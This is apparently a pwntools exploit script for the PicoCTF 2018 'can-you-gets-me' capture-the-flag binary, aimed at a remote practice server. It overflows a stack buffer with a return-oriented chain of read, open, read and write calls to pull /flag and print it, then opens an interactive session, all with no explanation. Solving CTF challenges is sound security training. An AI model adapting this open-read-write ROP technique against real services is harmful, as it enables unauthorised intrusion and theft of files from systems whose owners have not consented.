from pwn import *
context.log_level = 'debug'

# io = process('./PicoCTF_2018_can-you-gets-me')
io = remote('node4.buuoj.cn', 27340)
elf = ELF('./PicoCTF_2018_can-you-gets-me')

pop4 = 0x809d6f4
write_addr = 0x80EBD20

payload = cyclic(0x18 + 4)
payload += p32(elf.symbols['read'])
payload += p32(pop4)
payload += p32(0)
payload += p32(write_addr)
payload += p32(5)
payload += p32(0)
payload += p32(elf.symbols['open'])
payload += p32(pop4)
payload += p32(write_addr)
payload += p32(0) * 3
payload += p32(elf.symbols['read'])
payload += p32(pop4)
payload += p32(3)
payload += p32(write_addr)
payload += p32(0x30)
payload += p32(0)
payload += p32(elf.symbols['write'])
payload += p32(0)
payload += p32(1)
payload += p32(write_addr)
payload += p32(0x30)

io.sendlineafter(b'GIVE ME YOUR NAME!', payload)
time.sleep(0.5)
io.sendline(b'/flag')
io.interactive()
